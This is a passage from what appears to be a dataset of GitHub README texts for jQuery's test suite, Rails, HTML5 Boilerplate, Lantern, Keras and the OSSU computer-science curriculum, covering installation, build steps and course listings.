\"data/index.html?10538358428943\"\n\n\nurl(\"mock.php?foo=bar\");\n\n=> \"data/mock.php?foo=bar&10538358345554\"\nRun tests in an iframe\nSome tests may require a document other than the standard test fixture, and\nthese can be run in a separate iframe. The actual test code and assertions\nremain in jQuery's main test files; only the minimal test fixture markup\nand setup code should be placed in the iframe file.\ntestIframe( testName, fileName,\n  function testCallback(\n      assert, jQuery, window, document,\n\t  [ additional args ] ) {\n\t...\n  } );\nThis loads a page, constructing a url with fileName \"./data/\" + fileName.\nThe iframed page determines when the callback occurs in the test by\nincluding the \"/test/data/iframeTest.js\" script and calling\nstartIframeTest( [ additional args ] ) when appropriate. Often this\nwill be after either document ready or window.onload fires.\nThe testCallback receives the QUnit assert object created by testIframe\nfor this test, followed by the global jQuery, window, and document from\nthe iframe. If the iframe code passes any arguments to startIframeTest,\nthey follow the document argument.\nQuestions?\nIf you have any questions, please feel free to ask on the\nDeveloping jQuery Core forum or in #jquery on irc.freenode.net."}, {"title": "rails/rails", "language": "Ruby", "content": "Welcome to Rails\nWhat's Rails?\nRails is a web-application framework that includes everything needed to\ncreate database-backed web applications according to the\nModel-View-Controller (MVC)\npattern.\nUnderstanding the MVC pattern is key to understanding Rails. MVC divides your\napplication into three layers: Model, View, and Controller, each with a specific responsibility.\nModel layer\nThe Model layer represents the domain model (such as Account, Product,\nPerson, Post, etc.) and encapsulates the business logic specific to\nyour application. In Rails, database-backed model classes are derived from\nActiveRecord::Base. Active Record allows you to present the data from\ndatabase rows as objects and embellish these data objects with business logic\nmethods.\nAlthough most Rails models are backed by a database, models can also be ordinary\nRuby classes, or Ruby classes that implement a set of interfaces as provided by\nthe Active Model module.\nController layer\nThe Controller layer is responsible for handling incoming HTTP requests and\nproviding a suitable response. Usually this means returning HTML, but Rails controllers\ncan also generate XML, JSON, PDFs, mobile-specific views, and more. Controllers load and\nmanipulate models, and render view templates in order to generate the appropriate HTTP response.\nIn Rails, incoming requests are routed by Action Dispatch to an appropriate controller, and\ncontroller classes are derived from ActionController::Base. Action Dispatch and Action Controller\nare bundled together in Action Pack.\nView layer\nThe View layer is composed of \"templates\" that are responsible for providing\nappropriate representations of your application's resources. Templates can\ncome in a variety of formats, but most view templates are HTML with embedded\nRuby code (ERB files). Views are typically rendered to generate a controller response,\nor to generate the body of an email. In Rails, View generation is handled by Action View.\nFrameworks and libraries\nActive Record, Active Model, Action Pack, and Action View can each be used independently outside Rails.\nIn addition to that, Rails also comes with Action Mailer, a library\nto generate and send emails; Action Mailbox, a library to receive emails within a Rails application;\nActive Job, a framework for declaring jobs and making them run on a variety of queuing\nbackends; Action Cable, a framework to\nintegrate WebSockets with a Rails application; Active Storage, a library to attach cloud\nand local files to Rails applications; Action Text, a library to handle rich text content;\nand Active Support, a collection\nof utility classes and standard library extensions that are useful for Rails,\nand may also be used independently outside Rails.\nGetting Started\n\n\nInstall Rails at the command prompt if you haven't yet:\n $ gem install rails\n\n\n\nAt the command prompt, create a new Rails application:\n $ rails new myapp\n\nwhere \"myapp\" is the application name.\n\n\nChange directory to myapp and start the web server:\n $ cd myapp\n $ rails server\n\nRun with --help or -h for options.\n\n\nGo to http://localhost:3000 and you'll see:\n\"Yay! You\u2019re on Rails!\"\n\n\nFollow the guidelines to start developing your application. You may find\nthe following resources handy:\n\nGetting Started with Rails\nRuby on Rails Guides\nThe API Documentation\nRuby on Rails Tutorial\n\n\n\nContributing\n\nWe encourage you to contribute to Ruby on Rails! Please check out the\nContributing to Ruby on Rails guide for guidelines about how to proceed. Join us!\nTrying to report a possible security vulnerability in Rails? Please\ncheck out our security policy for\nguidelines about how to proceed.\nEveryone interacting in Rails and its sub-projects' codebases, issue trackers, chat rooms, and mailing lists is expected to follow the Rails code of conduct.\nCode Status\n\nLicense\nRuby on Rails is released under the MIT License."}, {"title": "h5bp/html5-boilerplate", "language": "JavaScript", "content": "HTML5 Boilerplate\n\n\nHTML5 Boilerplate is a professional front-end template for building\nfast, robust, and adaptable web apps or sites.\nThis project is the product of years of iterative development and\ncommunity knowledge. It does not impose a specific development\nphilosophy or framework, so you're free to architect your code in the\nway that you want.\n\nHomepage: https://html5boilerplate.com/\nSource: https://github.com/h5bp/html5-boilerplate\nTwitter: @h5bp\n\nQuick start\nChoose one of the following options:\n\nDownload the latest stable release from\nhtml5boilerplate.com.\nClone the git repo \u2014 git clone https://github.com/h5bp/html5-boilerplate.git - and checkout the\ntagged release\nyou'd like to use.\nInstall with npm: npm install html5-boilerplate and pull in what you need from the resulting node_modules/html5-boilerplate/dist\nInstall with yarn: yarn add html5-boilerplate\n\nFeatures\n\nHTML5 ready. Use the new elements with confidence.\nDesigned with progressive enhancement in mind.\nIncludes:\n\nNormalize.css\nfor CSS normalizations and common bug fixes\njQuery via CDN with SRI Hash and a local fallback\nA custom build of Modernizr for feature\ndetection\nApache Server Configs\nthat, among other, improve the web site's performance and security\n\n\nPlaceholder CSS Media Queries.\nUseful CSS helper classes.\nDefault print styles, performance optimized.\nAn optimized version of the Google Universal Analytics snippet.\nProtection against any stray console statements causing JavaScript\nerrors in older browsers.\n\"Delete-key friendly.\" Easy to strip out parts you don't need.\nExtensive inline and accompanying documentation.\n\nBrowser support\n\nChrome (latest 2)\nEdge (latest 2)\nFirefox (latest 2)\nInternet Explorer 11\nOpera (latest 2)\nSafari (latest 2)\n\nThis doesn't mean that HTML5 Boilerplate cannot be used in older browsers,\njust that we'll ensure compatibility with the ones mentioned above.\nIf you need legacy browser support you can use HTML5 Boilerplate v6 (IE9/IE10)\nor HTML5 Boilerplate v5 (IE 8). They are no longer actively developed.\nDocumentation\nTake a look at the documentation table of contents.\nThis documentation is bundled with the project which makes it\navailable for offline reading and provides a useful starting point for\nany documentation you want to write about your project.\nContributing\nHundreds of developers have helped to make the HTML5 Boilerplate. Anyone is welcome to contribute,\nhowever, if you decide to get involved, please take a moment to review\nthe guidelines:\n\nBug reports\nFeature requests\nPull requests\n\nLicense\nThe code is available under the MIT license."}, {"title": "getlantern/lantern", "language": "Go", "content": "lantern \u00a0\u00a0\n\ud83d\udd34\u84dd\u706f(Lantern)\u6700\u65b0\u7248\u4e0b\u8f7d\u70b9\u8fd9\u91cc\ud83d\udd34\nIf you're looking for Lantern installers, you can find all of them at the following links:\n\nAndroid\nWindows 7 and above\nOSX 10.10 and above\nUbuntu 14.04 32 bit\nUbuntu 14.04 64 bit\n\nIf you would like to give the latest but more UNSTABLE BETA versions a try, you can find all of them at the following links:\n\nAndroid\nWindows 7 and above\nOSX 10.10 and above\nUbuntu 14.04 32 bit\nUbuntu 14.04 64 bit\n\nIf you're looking for help, please visit below user forums:\n| English | \u4e2d\u6587 | \u0641\u0627\u0631\u0633\u06cc | fran\u00e7ais\nBuilding Lantern\nPrerequisites\n\nCustom fork of Go is\ncurrently required. We'll eventually switch to Go 1.7 which supports what we\nneed due to this.\nAn OSX or Linux host. Building on Windows is only partially supported with\nthe help of Cygwin.\nGit - brew install git, apt-get install git, etc\nGNU Make\nNodejs & NPM\nGNU C Library (linux only) - apt-get install libc6-dev-i386, etc\nGulp - npm i gulp-cli -g\n\nTo build and run Lantern desktop, just do:\ngit clone https://github.com/getlantern/lantern.git\ncd lantern\nmake lantern\n./lantern\nDuring development, you'll likely want to do a clean build like this:\nmake clean-desktop lantern && ./lantern\nBuilding Mobile\nMobile Prerequisites\nBuilding the mobile library and app requires the following:\n\nInstall Java JDK 7 or 8\nInstall Go 1.6 or higher\nInstall Android SDK Tools\nInstall NDK\nInstall Gradle\n\nMake sure to set these environment variables before trying to build any Android\ncomponents (replace the paths based on wherever you've installed the Android\nSDK and NDK).\nexport ANDROID_HOME=/opt/adt-bundle-mac-x86_64-20130917/sdk\nexport PATH=$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools:$ANDROID_HOME/build-tools:$PATH\nexport NDK_HOME=/opt/android-ndk-r10e\nexport PATH=$NDK_HOME:$PATH\nGo Android Library\nThe core Lantern functionality can be packaged into a native Android library\nwith:\nmake android-lib\n\nJava Android SDK\nThe Java-based Android SDK allows easy embedding of Lantern functionality in 3rd\nparty Android apps such as Manoto TV. The SDK can be built with:\nmake android-sdk\n\nLantern Mobile Testbed\nThis simple Android application provides a way to test the Android SDK. It can\nbe built with:\nmake android-testbed\n\nLantern Mobile App\nDebug\nTo create a debug build of the full lantern mobile app:\nmake android-debug\n\nTo install on the default device:\nmake android-install\n\nRelease\nTo create a release build, add the following to your\n~/.gradle/gradle.properties file:\nKEYSTORE_PWD=$KEYSTORE_PASSWORD\nKEYSTORE_FILE=keystore.release.jks\nKEY_PWD=$KEY_PASSWORD\n\nYou can find the exact values to add to your gradle.properties\nhere.\nThen it can be built with:\nSECRETS_DIR=$PATH_TO_TOO_MANY_SECRETS \\\nVERSION=2.0.0-beta1 make android-release\nAndroid Tips\nAndroid Studio\nTo get the build working for Android Studio, you'll want to add the following\ndummy values to your ~/.gradle/gradle.properties file:\nlanternRevisionDate=\"April 26, 2016\"\nlanternVersion=2.2.1\n\nUninstall for All Users\nIf you use adb to install and debug an app to your Android device during\ndevelopment and then subsequently build a signed APK and try to install it on\nthat same device, you may receive an unhelpful error saying \"App Not Installed\".\nThis typically means that you tried to install the same app but signed with a\ndifferent key.  The solution is to uninstall the app first, but you have to\nuninstall it for all users. You can do this by selecting \"Uninstall for all\nusers\" from:\nSettings -> Apps -> [Pick the App] -> Hamburger Menu (...) -> Uninstall for all users.\n\nIf you forget to do this and just uninstall normally, you'll still encounter the\nerror. To fix this, you'll have to run the app with adb again and then\nuninstall for all users.\nGetting HTTP Connections to Use Proxy\nIn android, programmatic access to HTTP resources typically uses the\nHttpURLConnection class.  You can tell it to use a proxy by setting some\nsystem properties:\nSystem.setProperty(\"http.proxyHost\", host);\nSystem.setProperty(\"http.proxyPort\", port);\nSystem.setProperty(\"https.proxyHost\", host);\nSystem.setProperty(\"https.proxyPort\", port);\nYou can disable proxying by clearing those properties:\nSystem.clearProperty(\"http.proxyHost\");\nSystem.clearProperty(\"http.proxyPort\");\nSystem.clearProperty(\"https.proxyHost\");\nSystem.clearProperty(\"https.proxyPort\");\nHowever, there is one big caveat - HttpURLConnection uses keep-alives to\nreuse existing TCP connections. These TCP connections will still be using the\nold proxy settings. This has several implications:\nSet the proxy settings as early in the application's lifecycle as possible,\nideally before any HttpURLConnections have been opened.\nDon't expect the settings to take effect immediately if some\nHttpURLConnections have already been opened.\nDisable keep-alives if you need to, which you can do like this:\nHttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n// Need to force closing so that old connections (with old proxy settings) don't get reused.\nurlConnection.setRequestProperty(\"Connection\", \"close\");\nBuilding Lantern for running on a server\nTo run Lantern on a server, you simply need to set a flag to build it in headless mode and then tell it to run on any local address as opposed to binding to localhost (so that it's accessible from other machines). You can do this as follows:\n\nHEADLESS=true make docker-linux or, if you're already running on Linux just HEADLESS=true make linux\n./lantern_linux_amd64 --addr 0.0.0.0:8787 or ./lantern_linux_386 --addr 0.0.0.0:8787\n\nOther\nGenerating assets\nmake genassets\nIf the environment variable UPDATE_DIST=true is set, make genassets also\nupdates the resources in the dist folder.\nAn annotated tag can be added like this:\ngit tag -a v1.0.0 -m\"Tagged 1.0.0\"\ngit push --tags\nUse make create-tag as a shortcut for creating and uploading tags:\nVERSION='2.0.0-beta5' make create-tag\n\nIf you want to both create a package and upload a tag, run the create-tag task\nright after the packages task:\n[...env variables...] make packages create-tag\n\nUpdating Icons\nThe icons used for the system tray are stored in\nsrc/github/getlantern/lantern/icons. To apply changes to the icons, make\nyour updates in the icons folder and then run make update-icons.\nContinuous Integration with Travis CI\nContinuous builds are run on Travis CI. These builds use the .travis.yml\nconfiguration.  The github.com/getlantern/cf unit tests require an envvars.bash\nto be populated with credentials for cloudflare. The original envvars.bash is\navailable\nhere.\nAn encrypted version is checked in as envvars.bash.enc, which was encrypted\nper the instructions here.\nDocumentation for developers\nDev README\nPlease, go to README-dev for an in-depth explanation of the Lantern internals and cloud services.\nRelease README\nPlease visit README-release for details on building release versions of Lantern.\nTranslations README\nMore info for dealing with translations is available in README-translations.\nContributing changes\nLantern is a gost project that\nprovides repeatable builds and consolidated pull requests for lantern.\nGo code in Lantern must pass several tests:\n\nerrcheck\ngolint\nGo vet\nGo test -race\n\nYou can find a generic git-hook\nfile, which can be used as a pre-push (or pre-commit) hook to automatically\nensure these tests are passed before committing any code. Only Go packages in\nsrc/github.com/getlantern will be tested, and only those that have changes in\nthem.\nInstall by copying it into the local .git/hooks/ directory, with the pre-push\nfile name if you want to run it before pushing. Alternatively, you can copy\npre-commit.hook\nto pre-commit to run it before each commit.\nln -s \"$(pwd)/prehook.sh\" .git/hooks/prehook.sh\nln -s \"$(pwd)/pre-push\" .git/hooks/pre-push\nImportant notice\nIf you must commit without running the hooks, you can run git with the\n--no-verify flag."}, {"title": "keras-team/keras", "language": "Python", "content": "Keras: Deep Learning for humans\n\n\n\nYou have just found Keras.\nKeras is a high-level neural networks API, written in Python and capable of running on top of TensorFlow, CNTK, or Theano. It was developed with a focus on enabling fast experimentation. Being able to go from idea to result with the least possible delay is key to doing good research.\nUse Keras if you need a deep learning library that:\n\nAllows for easy and fast prototyping (through user friendliness, modularity, and extensibility).\nSupports both convolutional networks and recurrent networks, as well as combinations of the two.\nRuns seamlessly on CPU and GPU.\n\nRead the documentation at Keras.io.\nKeras is compatible with: Python 2.7-3.6.\n\nGuiding principles\n\n\nUser friendliness. Keras is an API designed for human beings, not machines. It puts user experience front and center. Keras follows best practices for reducing cognitive load: it offers consistent & simple APIs, it minimizes the number of user actions required for common use cases, and it provides clear and actionable feedback upon user error.\n\n\nModularity. A model is understood as a sequence or a graph of standalone, fully configurable modules that can be plugged together with as few restrictions as possible. In particular, neural layers, cost functions, optimizers, initialization schemes, activation functions and regularization schemes are all standalone modules that you can combine to create new models.\n\n\nEasy extensibility. New modules are simple to add (as new classes and functions), and existing modules provide ample examples. To be able to easily create new modules allows for total expressiveness, making Keras suitable for advanced research.\n\n\nWork with Python. No separate models configuration files in a declarative format. Models are described in Python code, which is compact, easier to debug, and allows for ease of extensibility.\n\n\n\nGetting started: 30 seconds to Keras\nThe core data structure of Keras is a model, a way to organize layers. The simplest type of model is the Sequential model, a linear stack of layers. For more complex architectures, you should use the Keras functional API, which allows to build arbitrary graphs of layers.\nHere is the Sequential model:\nfrom keras.models import Sequential\n\nmodel = Sequential()\nStacking layers is as easy as .add():\nfrom keras.layers import Dense\n\nmodel.add(Dense(units=64, activation='relu', input_dim=100))\nmodel.add(Dense(units=10, activation='softmax'))\nOnce your model looks good, configure its learning process with .compile():\nmodel.compile(loss='categorical_crossentropy',\n              optimizer='sgd',\n              metrics=['accuracy'])\nIf you need to, you can further configure your optimizer. A core principle of Keras is to make things reasonably simple, while allowing the user to be fully in control when they need to (the ultimate control being the easy extensibility of the source code).\nmodel.compile(loss=keras.losses.categorical_crossentropy,\n              optimizer=keras.optimizers.SGD(lr=0.01, momentum=0.9, nesterov=True))\nYou can now iterate on your training data in batches:\n# x_train and y_train are Numpy arrays --just like in the Scikit-Learn API.\nmodel.fit(x_train, y_train, epochs=5, batch_size=32)\nAlternatively, you can feed batches to your model manually:\nmodel.train_on_batch(x_batch, y_batch)\nEvaluate your performance in one line:\nloss_and_metrics = model.evaluate(x_test, y_test, batch_size=128)\nOr generate predictions on new data:\nclasses = model.predict(x_test, batch_size=128)\nBuilding a question answering system, an image classification model, a Neural Turing Machine, or any other model is just as fast. The ideas behind deep learning are simple, so why should their implementation be painful?\nFor a more in-depth tutorial about Keras, you can check out:\n\nGetting started with the Sequential model\nGetting started with the functional API\n\nIn the examples folder of the repository, you will find more advanced models: question-answering with memory networks, text generation with stacked LSTMs, etc.\n\nInstallation\nBefore installing Keras, please install one of its backend engines: TensorFlow, Theano, or CNTK. We recommend the TensorFlow backend.\n\nTensorFlow installation instructions.\nTheano installation instructions.\nCNTK installation instructions.\n\nYou may also consider installing the following optional dependencies:\n\ncuDNN (recommended if you plan on running Keras on GPU).\nHDF5 and h5py (required if you plan on saving Keras models to disk).\ngraphviz and pydot (used by visualization utilities to plot model graphs).\n\nThen, you can install Keras itself. There are two ways to install Keras:\n\nInstall Keras from PyPI (recommended):\n\nNote: These installation steps assume that you are on a Linux or Mac environment.\nIf you are on Windows, you will need to remove sudo to run the commands below.\nsudo pip install keras\nIf you are using a virtualenv, you may want to avoid using sudo:\npip install keras\n\nAlternatively: install Keras from the GitHub source:\n\nFirst, clone Keras using git:\ngit clone https://github.com/keras-team/keras.git\nThen, cd to the Keras folder and run the install command:\ncd keras\nsudo python setup.py install\n\nConfiguring your Keras backend\nBy default, Keras will use TensorFlow as its tensor manipulation library. Follow these instructions to configure the Keras backend.\n\nSupport\nYou can ask questions and join the development discussion:\n\nOn the Keras Google group.\nOn the Keras Slack channel. Use this link to request an invitation to the channel.\n\nYou can also post bug reports and feature requests (only) in GitHub issues. Make sure to read our guidelines first.\n\nWhy this name, Keras?\nKeras (\u03ba\u03ad\u03c1\u03b1\u03c2) means horn in Greek. It is a reference to a literary image from ancient Greek and Latin literature, first found in the Odyssey, where dream spirits (Oneiroi, singular Oneiros) are divided between those who deceive men with false visions, who arrive to Earth through a gate of ivory, and those who announce a future that will come to pass, who arrive through a gate of horn. It's a play on the words \u03ba\u03ad\u03c1\u03b1\u03c2 (horn) / \u03ba\u03c1\u03b1\u03af\u03bd\u03c9 (fulfill), and \u1f10\u03bb\u03ad\u03c6\u03b1\u03c2 (ivory) / \u1f10\u03bb\u03b5\u03c6\u03b1\u03af\u03c1\u03bf\u03bc\u03b1\u03b9 (deceive).\nKeras was initially developed as part of the research effort of project ONEIROS (Open-ended Neuro-Electronic Intelligent Robot Operating System).\n\n\"Oneiroi are beyond our unravelling --who can be sure what tale they tell? Not all that men look for comes to pass. Two gates there are that give passage to fleeting Oneiroi; one is made of horn, one of ivory. The Oneiroi that pass through sawn ivory are deceitful, bearing a message that will not be fulfilled; those that come out through polished horn have truth behind them, to be accomplished for men who see them.\" Homer, Odyssey 19. 562 ff (Shewring translation)."}, {"title": "ossu/computer-science", "language": "Python", "content": "Open Source Society University\n\n  Path to a free self-taught education in Computer Science!\n\n\n\n\n\n\n\n\n\n\n\n\nContents\n\nSummary\nCurriculum\n\nPrerequisites\nIntroduction to Computer Science\nCore CS\nAdvanced CS\nFinal project\nPro CS\n\n\nCode of conduct\nCommunity\n\nHow to show your progress\nTeam\n\n\nReferences\n\nSummary\nThe OSSU curriculum is a complete education in computer science using online materials.\nIt's not merely for career training or professional development.\nIt's for those who want a proper, well-rounded grounding in concepts fundamental to all computing disciplines,\nand for those who have the discipline, will, and (most importantly!) good habits to obtain this education largely on their own,\nbut with support from a worldwide community of fellow learners.\nIt is designed according to the degree requirements of undergraduate computer science majors, minus general education (non-CS) requirements,\nas it is assumed most of the people following this curriculum are already educated outside the field of CS.\nThe courses themselves are among the very best in the world, often coming from Harvard, Princeton, MIT, etc.,\nbut specifically chosen to meet the following criteria.\nCourses must:\n\nBe open for enrollment\nRun regularly (ideally in self-paced format, otherwise running at least once a month or so)\nFulfill the academic requirements of OSSU\nFit neatly into the progression of the curriculum with respect to topics and difficulty level\nBe of generally high quality in teaching materials and pedagogical principles\n\nWhen no course meets the above criteria, the coursework is supplemented with a book.\nWhen there are courses or books that don't fit into the curriculum but are otherwise of high quality,\nthey belong in extras/courses or extras/readings.\nOrganization. The curriculum is designed as follows:\n\nIntro CS: for students to try out CS and see if it's right for them\nCore CS: corresponds roughly to the first three years of a computer science curriculum, taking classes that all majors would be required to take\nAdvanced CS: corresponds roughly to the final year of a computer science curriculum, taking electives according to the student's interests\nFinal Project: a project for students to validate, consolidate, and display their knowledge, to be evaluated by their peers worldwide\nPro CS: graduate-level specializations students can elect to take after completing the above curriculum if they want to maximize their chances of getting a good job\n\nDuration. It is possible to finish Core CS within about 2 years if you plan carefully and devote roughly 18-22 hours/week to your studies.\nCourses in Core CS should be taken linearly if possible, but since a perfectly linear progression is rarely possible,\neach class's prerequisites is specified so that you can design a logical but non-linear progression\nbased on the class schedules and your own life plans.\nCost. All or nearly all course material prior to Pro CS is available for free.\nHowever, some courses may charge money for assignments/tests/projects to be graded.\nNote that Coursera offers financial aid.\nDecide how much or how little to spend based on your own time and budget;\njust remember that you can't purchase success!\nProcess. Students can work through the curriculum alone or in groups, in order or out of order.\n\nFor grouping up, please use the cohorts repository to find or create a cohort suited to you.\nWe recommend doing all courses in Core CS, only skipping a course when you are certain that you've already learned the material previously.\nFor simplicity, we recommend working through courses (especially Core CS) in order from top to bottom, as they have already been topologically sorted by their prerequisites.\nCourses in Advanced CS are electives. Choose one subject (e.g. Advanced programming) you want to become an expert in, and take all the courses under that heading. You can also create your own custom subject, but we recommend getting validation from the community on the subject you choose.\n\nContent policy. If you plan on showing off some of your coursework publicly, you must share only files that you are allowed to.\nDo NOT disrespect the code of conduct that you signed in the beginning of each course!\nHow to contribute. Please see CONTRIBUTING.\nGetting help. Please check our Frequently Asked Questions, and if you cannot find the answer, file an issue or talk to our friendly community!\nCurriculum\nCurriculum version: 8.0.0 (see CHANGELOG)\n\nPrerequisites\nIntroduction to Computer Science\nCore CS\n\nCore programming\nCore math\nCore systems\nCore theory\nCore applications\n\n\nAdvanced CS\n\nAdvanced programming\nAdvanced math\nAdvanced systems\nAdvanced theory\nAdvanced applications\n\n\nFinal project\nPro CS\n\n\nPrerequisites\n\nCore CS assumes the student has already taken high school math and physics, including algebra, geometry, and pre-calculus.\nSome high school graduates will have already taken AP Calculus, but this is usually only about 3/4 of a college calculus class, so the calculus courses in the curriculum are still recommended.\nAdvanced CS assumes the student has already taken the entirety of Core CS\nand is knowledgeable enough now to decide which electives to take.\nNote that Advanced systems assumes the student has taken a basic physics course (e.g. AP Physics in high school).\n\nIntroduction to Computer Science\nThis course will introduce you to the world of computer science.\nTopics covered:\ncomputation\nimperative programming\nbasic data structures and algorithms\nand more\n\n\n\nCourses\nDuration\nEffort\nPrerequisites\n\n\n\n\nIntroduction to Computer Science and Programming using Python (alt)\n9 weeks\n15 hours/week\nhigh school algebra\n\n\n\nCore CS\nAll coursework under Core CS is required, unless otherwise indicated.\nCore programming\nTopics covered:\nfunctional programming\ndesign for testing\nprogram requirements\ncommon design patterns\nunit testing\nobject-oriented design\nJava\nstatic typing\ndynamic typing\nML-family languages (via Standard ML)\nLisp-family languages (via Racket)\nRuby\nand more\n\n\n\nCourses\nDuration\nEffort\nPrerequisites\n\n\n\n\nHow to Code - Simple Data\n7 weeks\n8-10 hours/week\nnone\n\n\nHow to Code - Complex Data\n6 weeks\n8-10 hours/week\nHow to Code: Simple Data\n\n\nSoftware Construction - Data Abstraction\n6 weeks\n8-10 hours/week\nHow to Code - Complex Data\n\n\nSoftware Construction - Object-Oriented Design\n6 weeks\n8-10 hours/week\nSoftware Construction - Data Abstraction\n\n\nProgramming Languages, Part A\n4 weeks\n8-16 hours/week\nrecommended: Java, C\n\n\nProgramming Languages, Part B\n3 weeks\n8-16 hours/week\nProgramming Languages, Part A\n\n\nProgramming Languages, Part C\n3 weeks\n8-16 hours/week\nProgramming Languages, Part B\n\n\n\nReadings\n\nRequired to learn about monads, laziness, purity: Learn You a Haskell for a Great Good!\n\nNote: probably the best resource to learn Haskell: Haskell Programming from First Principles paid\n\n\nRequired, to learn about logic programming, backtracking, unification: Learn Prolog Now!\n\nCore math\nTopics covered:\nlinear transformations\nmatrices\nvectors\nmathematical proofs\nnumber theory\ndifferential calculus\nintegral calculus\nsequences and series\ndiscrete mathematics\nbasic statistics\nO-notation\ngraph theory\nvector calculus\ndiscrete probability\nand more\n\n\n\nCourses\nDuration\nEffort\nPrerequisites\n\n\n\n\nEssence of Linear Algebra\n-\n-\npre-calculus\n\n\nLinear Algebra - Foundations to Frontiers (alt)\n15 weeks\n8 hours/week\nEssence of Linear Algebra\n\n\nCalculus 1A: Differentiation\n13 weeks\n6-10 hours/week\npre-calculus\n\n\nCalculus 1B: Integration\n13 weeks\n5-10 hours/week\nCalculus 1A\n\n\nCalculus 1C: Coordinate Systems & Infinite Series\n13 weeks\n5-10 hours/week\nCalculus 1B\n\n\nMathematics for Computer Science1\n13 weeks\n5 hours/week\nCalculus 1C\n\n\n\n1: Students struggling with MIT Math for CS can consider taking the Discrete Mathematics Specialization first.\nIt is more interactive but less comprehensive, and it costs money to unlock full interactivity.\nCore systems\nSkip to the second course (Nand2Tetris) when the first course (CS50) moves away from C.\n(Why?)\nTopics covered:\nprocedural programming\nmanual memory management\nboolean algebra\ngate logic\nmemory\ncomputer architecture\nassembly\nmachine language\nvirtual machines\nhigh-level languages\ncompilers\noperating systems\nnetwork protocols\nand more\n\n\n\nCourses\nDuration\nEffort\nPrerequisites\n\n\n\n\nIntroduction to Computer Science - CS50 (alt)\n12 weeks\n10-20 hours/week\nintroductory programming\n\n\nBuild a Modern Computer from First Principles: From Nand to Tetris (alt)\n6 weeks\n7-13 hours/week\nC-like programming language\n\n\nBuild a Modern Computer from First Principles: Nand to Tetris Part II \n6 weeks\n12-18 hours/week\none of these programming languages, From Nand to Tetris Part I\n\n\nIntroduction to Computer Networking\n8 weeks\n4\u201312 hours/week\nalgebra, probability, basic CS\n\n\nops-class.org - Hack the Kernel\n15 weeks\n6 hours/week\nalgorithms\n\n\n\nReadings\n\nRecommended: While Hack the Kernel recommends Modern Operating Systems as a textbook, we suggest using Operating Systems: Three Easy Pieces.\n\nCore theory\nTopics covered:\ndivide and conquer\nsorting and searching\nrandomized algorithms\ngraph search\nshortest paths\ndata structures\ngreedy algorithms\nminimum spanning trees\ndynamic programming\nNP-completeness\nand more\n\n\n\nCourses\nDuration\nEffort\nPrerequisites\n\n\n\n\nAlgorithms: Design and Analysis, Part I\n8 weeks\n4-8 hours/week\nany programming language, Mathematics for Computer Science\n\n\nAlgorithms: Design and Analysis, Part II\n8 weeks\n4-8 hours/week\nPart I\n\n\n\nCore applications\nTopics covered:\nAgile methodology\nREST\nsoftware specifications\nrefactoring\nrelational databases\ntransaction processing\ndata modeling\nneural networks\nsupervised learning\nunsupervised learning\nOpenGL\nraytracing\nblock ciphers\nauthentication\npublic key encryption\nand more\n\n\n\nCourses\nDuration\nEffort\nPrerequisites\n\n\n\n\nDatabases\n12 weeks\n8-12 hours/week\nsome programming, basic CS\n\n\nMachine Learning\n11 weeks\n4-6 hours/week\nlinear algebra\n\n\nComputer Graphics\n6 weeks\n12 hours/week\nC++ or Java, linear algebra\n\n\nCryptography I\n6 weeks\n5-7 hours/week\nlinear algebra, probability\n\n\nSoftware Engineering: Introduction\n6 weeks\n8-10 hours/week\nSoftware Construction - Object-Oriented Design\n\n\nSoftware Development Capstone Project\n6-7 weeks\n8-10 hours/week\nSoftware Engineering: Introduction\n\n\n\nAdvanced CS\nAfter completing every required course in Core CS, students should choose a subset of courses from Advanced CS based on interest.\nNot every course from a subcategory needs to be taken.\nBut students should take every course that is relevant to the field they intend to go into.\nThe Advanced CS study should then end with one of the Specializations under Advanced applications.\nA Specialization's Capstone, if taken, may act as the Final project, if permitted by the Honor Code of the course.\nIf not, or if a student chooses not to take the Capstone, then a separate Final project will need to be done to complete this curriculum.\nAdvanced programming\nTopics covered:\ndebugging theory and practice\ngoal-oriented programming\nGPU programming\nCUDA\nparallel computing\nobject-oriented analysis and design\nUML\nlarge-scale software architecture and design\nand more\n\n\n\nCourses\nDuration\nEffort\nPrerequisites\n\n\n\n\nCompilers\n9 weeks\n6-8 hours/week\nnone\n\n\nSoftware Debugging\n8 weeks\n6 hours/week\nPython, object-oriented programming\n\n\nSoftware Testing\n4 weeks\n6 hours/week\nPython, programming experience\n\n\nLAFF - On Programming for Correctness\n7 weeks\n6 hours/week\nlinear algebra\n\n\nIntroduction to Parallel Programming (alt)\n12 weeks\n-\nC, algorithms\n\n\nSoftware Architecture & Design\n8 weeks\n6 hours/week\nsoftware engineering in Java\n\n\n\nAdvanced math\nTopics covered:\nparametric equations\npolar coordinate systems\nmultivariable integrals\nmultivariable differentials\nprobability theory\nand more\n\n\n\nCourses\nDuration\nEffort\nPrerequisites\n\n\n\n\nMultivariable Calculus\n13 weeks\n12 hours/week\nMIT Calculus 1C\n\n\nIntroduction to Probability - The Science of Uncertainty\n18 weeks\n12 hours/week\nMultivariable Calculus\n\n\n\nAdvanced systems\nTopics covered:\ndigital signaling\ncombinational logic\nCMOS technologies\nsequential logic\nfinite state machines\nprocessor instruction sets\ncaches\npipelining\nvirtualization\nparallel processing\nvirtual memory\nsynchronization primitives\nsystem call interface\nand more\n\n\n\nCourses\nDuration\nEffort\nPrerequisites\n\n\n\n\nReliable Distributed Systems, Part 1\n5 weeks\n5 hours/week\nScala, intermediate CS\n\n\nReliable Distributed Systems, Part 2\n5 weeks\n5 hours/week\nPart 1\n\n\nElectricity and Magnetism, Part 11\n7 weeks\n8-10 hours/week\ncalculus, basic mechanics\n\n\nElectricity and Magnetism, Part 2\n7 weeks\n8-10 hours/week\nElectricity and Magnetism, Part 1\n\n\nComputation Structures 1: Digital Circuits\n10 weeks\n6 hours/week\nelectricity, magnetism\n\n\nComputation Structures 2: Computer Architecture\n10 weeks\n6 hours/week\nComputation Structures 1\n\n\nComputation Structures 3: Computer Organization\n10 weeks\n6 hours/week\nComputation Structures 2\n\n\n\n1 Note:\nThese courses assume knowledge of basic physics.\n(Why?)\nIf you are struggling, you can find a physics MOOC or utilize the materials from Khan Academy:\nKhan Academy - Physics\nAdvanced theory\nTopics covered:\nformal languages\nTuring machines\ncomputability\nevent-driven concurrency\nautomata\ndistributed shared memory\nconsensus algorithms\nstate machine replication\ncomputational geometry theory\npropositional logic\nrelational logic\nHerbrand logic\nconcept lattices\ngame trees\nand 